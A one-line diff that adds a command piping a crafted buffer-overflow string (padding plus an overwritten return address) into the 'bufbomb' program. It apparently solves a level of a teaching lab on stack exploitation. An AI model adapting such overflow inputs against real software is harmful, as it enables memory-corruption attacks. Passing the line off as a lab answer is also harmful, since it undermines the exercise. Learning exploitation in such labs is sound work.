@@ -1,0 +1,1 @@
+python -c "print 'a'*44 + '\x14\x8b\x04\x08'" | ./bufbomb -u p20150699
